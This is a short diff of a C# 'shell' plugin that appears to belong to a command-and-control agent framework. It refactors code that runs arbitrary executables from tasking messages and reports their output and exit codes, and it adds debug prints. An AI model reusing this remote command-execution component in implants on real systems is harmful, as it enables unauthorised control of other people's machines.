@@ -7,23 +7,25 @@ using System.Text;
 
 namespace Plugins
 {
-    public class Plugin : AthenaPlugin
+    public class Shell : AthenaPlugin
     {
         public override string Name => "shell";
         Dictionary<string, Process> runningProcs = new Dictionary<string, Process>();
-        public override void Execute(Dictionary<string, object> args)
+        public override void Execute(Dictionary<string, string> args)
         {
+            Console.WriteLine("in shell execute.");
             try
             {
                 PluginHandler.AddResponse(ShellExec(args));
             }
             catch (Exception e)
             {
+                Console.WriteLine(e);
                 //oh no an error
                 PluginHandler.Write(e.ToString(), (string)args["task-id"], true, "error");
             }
         }
-        public void Kill(Dictionary<string, object> args)
+        public void Kill(Dictionary<string, string> args)
         {
             try
             {
@@ -52,7 +54,7 @@ namespace Plugins
                 });
             }
         }
-        public ResponseResult ShellExec(Dictionary<string, object> args)
+        public ResponseResult ShellExec(Dictionary<string, string> args)
         {
             string parameters = "";
             if (!String.IsNullOrEmpty((string)args["arguments"]))
@@ -61,7 +63,6 @@ namespace Plugins
             }
 
             string executable = (string)args["executable"];
-
 
             Process process = new Process
             {
@@ -87,7 +88,6 @@ namespace Plugins
                 process.BeginOutputReadLine();
 
                 process.WaitForExit();
-
                 ResponseResult result = new ResponseResult()
                 {
                     user_output = Environment.NewLine + "Process Finished.",
@@ -100,7 +100,6 @@ namespace Plugins
                     result.status = "error";
                     result.user_output += Environment.NewLine + "Process exited with code: " + process.ExitCode;
                 }
-
                 return result;
             }
             catch (Exception e)
